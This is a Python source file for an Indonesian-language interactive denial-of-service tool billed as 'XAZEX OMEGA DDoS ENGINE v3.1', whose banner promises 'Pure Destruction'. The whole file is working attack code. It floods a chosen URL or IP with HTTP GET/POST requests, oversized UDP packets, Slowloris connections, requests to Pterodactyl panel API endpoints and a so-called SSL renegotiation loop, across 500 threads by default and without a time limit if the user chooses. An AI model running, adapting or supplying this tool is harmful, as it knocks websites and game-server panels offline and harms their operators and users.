#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import socket
import threading
import random
import time
import sys
import os
import ssl
import platform
import signal
from urllib.parse import urlparse
from http.client import HTTPSConnection, HTTPConnection

# ======================= GLOBAL VARIABLES =======================
TARGET_URL = ""
TARGET_IP = ""
TARGET_PORT = 80
THREADS = 500
DURATION = 0
PROXY_LIST = []
STOP_EVENT = threading.Event()  # Untuk menghentikan semua thread dengan aman

# ======================= FUNGSI CLEAR SCREEN =======================
def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

# ======================= FUNGSI PRINT DENGAN WARNA =======================
def print_color(text, color='white', bold=False, end='\n'):
    colors = {
        'red': '\033[91m',
        'green': '\033[92m',
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'magenta': '\033[95m',
        'cyan': '\033[96m',
        'white': '\033[97m',
        'reset': '\033[0m'
    }
    style = '\033[1m' if bold else ''
    print(f"{style}{colors.get(color, '')}{text}{colors['reset']}", end=end)

# ======================= HEADER MENU PROFESIONAL =======================
def show_header():
    clear_screen()
    print_color("╔══════════════════════════════════════════════════════════════════╗", 'cyan', True)
    print_color("║                                                                  ║", 'cyan', True)
    print_color("║           ██████╗ ███████╗ █████╗ ██╗  ██╗ █████╗ ███████╗       ║", 'cyan', True)
    print_color("║           ██╔══██╗╚══███╔╝██╔══██╗██║  ██║██╔══██╗██╔════╝       ║", 'cyan', True)
    print_color("║           ██║  ██║  ███╔╝ ███████║███████║███████║█████╗         ║", 'cyan', True)
    print_color("║           ██║  ██║ ███╔╝  ██╔══██║██╔══██║██╔══██║██╔══╝         ║", 'cyan', True)
    print_color("║           ██████╔╝███████╗██║  ██║██║  ██║██║  ██║███████╗       ║", 'cyan', True)
    print_color("║           ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝       ║", 'cyan', True)
    print_color("║                                                                  ║", 'cyan', True)
    print_color("║            ██████╗ ██████╗  ██████╗ ███████╗                     ║", 'cyan', True)
    print_color("║           ██╔═══╝ ██╔══██╗██╔═══██╗██╔════╝                     ║", 'cyan', True)
    print_color("║           ██║     ██║  ██║██║   ██║███████╗                     ║", 'cyan', True)
    print_color("║           ██║     ██║  ██║██║   ██║╚════██║                     ║", 'cyan', True)
    print_color("║           ╚██████╗██████╔╝╚██████╔╝███████║                     ║", 'cyan', True)
    print_color("║            ╚═════╝╚═════╝  ╚═════╝ ╚══════╝                     ║", 'cyan', True)
    print_color("║                                                                  ║", 'cyan', True)
    print_color("║                   XAZEX OMEGA DDoS ENGINE v3.1                   ║", 'yellow', True)
    print_color("║              \"No Mercy. No Limits. Pure Destruction.\"            ║", 'red', True)
    print_color("║                                                                  ║", 'cyan', True)
    print_color("╚══════════════════════════════════════════════════════════════════╝", 'cyan', True)
    print()

# ======================= FUNGSI MENU UTAMA =======================
def main_menu():
    show_header()
    print_color("  [1]  HTTP Flood (GET / POST)", 'green')
    print_color("  [2]  UDP Flood (IP langsung)", 'green')
    print_color("  [3]  Slowloris (Memakan koneksi)", 'green')
    print_color("  [4]  Pterodactyl Flood (API Panel)", 'green')
    print_color("  [5]  SSL Renegotiation (HTTPS)", 'green')
    print_color("  [6]  ALL Methods (Kombinasi Brutal)", 'red', True)
    print_color("  [7]  Set Target (URL / IP)", 'yellow')
    print_color("  [8]  Set Thread Count (Default: 500)", 'yellow')
    print_color("  [9]  Set Duration (0 = Infinite)", 'yellow')
    print_color("  [10] Start Attack", 'magenta', True)
    print_color("  [0]  Exit", 'red')
    print()
    print_color("  ────────────────────────────────────────────────────", 'cyan')
    print()

# ======================= VEKTOR SERANGAN (DENGAN CEK STOP_EVENT) =======================
def http_flood(target_url, thread_id):
    headers_pool = [
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"},
        {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"},
        {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"},
        {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
    ]
    paths = ["/", "/index.html", "/wp-admin", "/api/v1", "/login", "/dashboard", "/panel", "/server", "/pterodactyl", "/api/client"]
    parsed = urlparse(target_url)
    host = parsed.netloc
    scheme = parsed.scheme

    while not STOP_EVENT.is_set():
        try:
            path = random.choice(paths)
            headers = random.choice(headers_pool)
            headers["Host"] = host
            headers["Accept-Encoding"] = "gzip, deflate, br"
            headers["Connection"] = "keep-alive"
            headers["Cache-Control"] = "no-cache"
            query = f"?{random.randint(100000, 999999)}"
            full_path = path + query

            if scheme == "https":
                conn = HTTPSConnection(host, timeout=5)
            else:
                conn = HTTPConnection(host, timeout=5)

            if random.choice([True, False]):
                conn.request("GET", full_path, headers=headers)
            else:
                data = f"username={random.randint(1,9999)}&password={random.randint(1,9999)}"
                conn.request("POST", path, body=data, headers=headers)

            response = conn.getresponse()
            response.read()
            conn.close()
            print_color(f"[Thread {thread_id}] HTTP -> {response.status}", 'green')
        except Exception as e:
            print_color(f"[Thread {thread_id}] HTTP Error: {e}", 'red')
        time.sleep(0.01)

def udp_flood(ip, port, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    packet_size = 65507
    while not STOP_EVENT.is_set():
        try:
            payload = random._urandom(packet_size)
            sock.sendto(payload, (ip, port))
            print_color(f"[Thread {thread_id}] UDP packet -> {ip}:{port}", 'cyan')
        except Exception as e:
            print_color(f"[Thread {thread_id}] UDP Error: {e}", 'red')
        time.sleep(0.001)

def slowloris(target_ip, target_port, thread_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
        sock.send(b"GET / HTTP/1.1\r\n")
        sock.send(b"Host: " + target_ip.encode() + b"\r\n")
        sock.send(b"User-Agent: Mozilla/5.0\r\n")
        while not STOP_EVENT.is_set():
            sock.send(b"X-Header: " + random._urandom(10) + b"\r\n")
            time.sleep(5)
    except Exception as e:
        print_color(f"[Thread {thread_id}] Slowloris Error: {e}", 'red')
        time.sleep(1)

def pterodactyl_flood(target_url, thread_id):
    parsed = urlparse(target_url)
    host = parsed.netloc
    endpoints = [
        "/api/client/servers",
        "/api/client/account",
        "/api/client/permissions",
        "/api/application/users",
        "/api/application/nodes",
        "/api/application/servers",
        "/api/application/locations"
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Authorization": "Bearer " + "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=40))
    }
    while not STOP_EVENT.is_set():
        try:
            path = random.choice(endpoints)
            url = f"{target_url}{path}"
            if random.choice([True, False]):
                resp = requests.get(url, headers=headers, timeout=3)
            else:
                data = {"name": "attack_" + str(random.randint(1,9999))}
                resp = requests.post(url, headers=headers, json=data, timeout=3)
            print_color(f"[Thread {thread_id}] Pterodactyl -> {resp.status_code}", 'magenta')
        except Exception as e:
            print_color(f"[Thread {thread_id}] Pterodactyl Error: {e}", 'red')
        time.sleep(0.01)

def ssl_reneg(target_ip, target_port, thread_id):
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
        while not STOP_EVENT.is_set():
            ssl_sock.send(b"R")
            time.sleep(0.1)
    except Exception as e:
        print_color(f"[Thread {thread_id}] SSL Error: {e}", 'red')
        time.sleep(1)

# ======================= HANDLER SIGINT =======================
def signal_handler(sig, frame):
    print_color("\n  [⏹] Interrupt diterima. Menghentikan semua thread...", 'red', True)
    STOP_EVENT.set()
    time.sleep(1)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ======================= FUNGSI MAIN =======================
def main():
    global TARGET_URL, TARGET_IP, TARGET_PORT, THREADS, DURATION

    while True:
        main_menu()
        choice = input("  >>> ").strip()

        if choice == "0":
            print_color("  Keluar dari XAZEX OMEGA...", 'red')
            sys.exit(0)

        elif choice in ["1", "2", "3", "4", "5", "6"]:
            # Pilih metode, tapi belum start
            method_choice = choice
            print_color(f"  Metode {choice} dipilih. Gunakan menu 10 untuk start.", 'yellow')
            input("  Tekan Enter untuk lanjut...")
            continue

        elif choice == "7":
            # Set target
            print_color("  Masukkan URL target (contoh: https://example.com):", 'yellow')
            TARGET_URL = input("  >> ").strip()
            try:
                parsed = urlparse(TARGET_URL)
                TARGET_IP = socket.gethostbyname(parsed.netloc)
                TARGET_PORT = 443 if parsed.scheme == "https" else 80
                print_color(f"  IP terdeteksi: {TARGET_IP}, Port: {TARGET_PORT}", 'green')
            except:
                print_color("  [ERROR] Gagal resolve IP. Masukkan IP manual.", 'red')
                TARGET_IP = input("  Masukkan IP target: ").strip()
            input("  Tekan Enter untuk lanjut...")
            continue

        elif choice == "8":
            try:
                THREADS = int(input("  Jumlah thread (default 500): ").strip() or "500")
                print_color(f"  Thread diset ke {THREADS}", 'green')
            except:
                print_color("  [ERROR] Masukkan angka valid!", 'red')
            input("  Tekan Enter untuk lanjut...")
            continue

        elif choice == "9":
            try:
                durasi_input = input("  Durasi dalam detik (0 = infinite): ").strip() or "0"
                DURATION = int(durasi_input)
                if DURATION < 0:
                    DURATION = 0
                print_color(f"  Durasi diset ke {DURATION} detik", 'green')
            except:
                print_color("  [ERROR] Masukkan angka valid!", 'red')
            input("  Tekan Enter untuk lanjut...")
            continue

        elif choice == "10":
            # Start attack
            if not TARGET_URL and not TARGET_IP:
                print_color("  [ERROR] Target belum diset! (Menu 7)", 'red')
                input("  Tekan Enter untuk lanjut...")
                continue

            # Tanyakan metode lagi
            print_color("  Pilih metode serangan:", 'yellow')
            print_color("  1. HTTP Flood\n  2. UDP Flood\n  3. Slowloris\n  4. Pterodactyl\n  5. SSL Renegotiation\n  6. ALL", 'green')
            method_choice = input("  Pilih (1-6): ").strip()
            if method_choice not in ["1","2","3","4","5","6"]:
                print_color("  [ERROR] Pilihan tidak valid!", 'red')
                input("  Tekan Enter untuk lanjut...")
                continue

            # Definisikan fungsi serangan
            if method_choice == "1":
                if not TARGET_URL:
                    print_color("  [ERROR] URL target belum diset!", 'red')
                    input("  Tekan Enter untuk lanjut...")
                    continue
                attack_func = lambda id: http_flood(TARGET_URL, id)
                method_name = "HTTP Flood"
            elif method_choice == "2":
                if not TARGET_IP:
                    print_color("  [ERROR] IP target belum diset!", 'red')
                    input("  Tekan Enter untuk lanjut...")
                    continue
                attack_func = lambda id: udp_flood(TARGET_IP, TARGET_PORT, id)
                method_name = "UDP Flood"
            elif method_choice == "3":
                if not TARGET_IP:
                    print_color("  [ERROR] IP target belum diset!", 'red')
                    input("  Tekan Enter untuk lanjut...")
                    continue
                attack_func = lambda id: slowloris(TARGET_IP, TARGET_PORT, id)
                method_name = "Slowloris"
            elif method_choice == "4":
                if not TARGET_URL:
                    print_color("  [ERROR] URL target belum diset!", 'red')
                    input("  Tekan Enter untuk lanjut...")
                    continue
                attack_func = lambda id: pterodactyl_flood(TARGET_URL, id)
                method_name = "Pterodactyl Flood"
            elif method_choice == "5":
                if not TARGET_IP:
                    print_color("  [ERROR] IP target belum diset!", 'red')
                    input("  Tekan Enter untuk lanjut...")
                    continue
                attack_func = lambda id: ssl_reneg(TARGET_IP, TARGET_PORT, id)
                method_name = "SSL Renegotiation"
            else:  # ALL
                if not TARGET_URL or not TARGET_IP:
                    print_color("  [ERROR] Target URL dan IP harus diset!", 'red')
                    input("  Tekan Enter untuk lanjut...")
                    continue
                def mixed_attack(id):
                    methods = [http_flood, udp_flood, slowloris, pterodactyl_flood, ssl_reneg]
                    method = random.choice(methods)
                    if method in [http_flood, pterodactyl_flood]:
                        method(TARGET_URL, id)
                    else:
                        method(TARGET_IP, TARGET_PORT, id)
                attack_func = mixed_attack
                method_name = "ALL Methods"

            # Reset stop event
            STOP_EVENT.clear()

            print_color(f"  🚀 Memulai {method_name} ke {TARGET_URL or TARGET_IP} dengan {THREADS} thread...", 'red', True)
            print_color("  Tekan Ctrl+C untuk menghentikan.", 'yellow')
            time.sleep(2)

            # Jalankan thread
            threads = []
            for i in range(THREADS):
                t = threading.Thread(target=attack_func, args=(i,))
                t.daemon = True
                t.start()
                threads.append(t)

            # Tunggu durasi atau infinite
            if DURATION > 0:
                # Gunakan loop kecil untuk menghindari overflow
                remaining = DURATION
                while remaining > 0 and not STOP_EVENT.is_set():
                    time.sleep(1)
                    remaining -= 1
                if not STOP_EVENT.is_set():
                    print_color(f"  [⏹] Durasi {DURATION} detik habis. Menghentikan serangan.", 'yellow')
                    STOP_EVENT.set()
                    # Tunggu thread berhenti
                    for t in threads:
                        t.join(timeout=1)
                    input("  Tekan Enter untuk lanjut...")
                    continue
            else:
                # Infinite, tunggu sampai interrupt
                try:
                    while not STOP_EVENT.is_set():
                        time.sleep(1)
                except KeyboardInterrupt:
                    pass
                finally:
                    print_color("  [⏹] Serangan dihentikan.", 'red')
                    STOP_EVENT.set()
                    for t in threads:
                        t.join(timeout=1)
                    input("  Tekan Enter untuk lanjut...")
                    continue

        else:
            print_color("  [ERROR] Pilihan tidak valid!", 'red')
            input("  Tekan Enter untuk lanjut...")

if __name__ == "__main__":
    main()
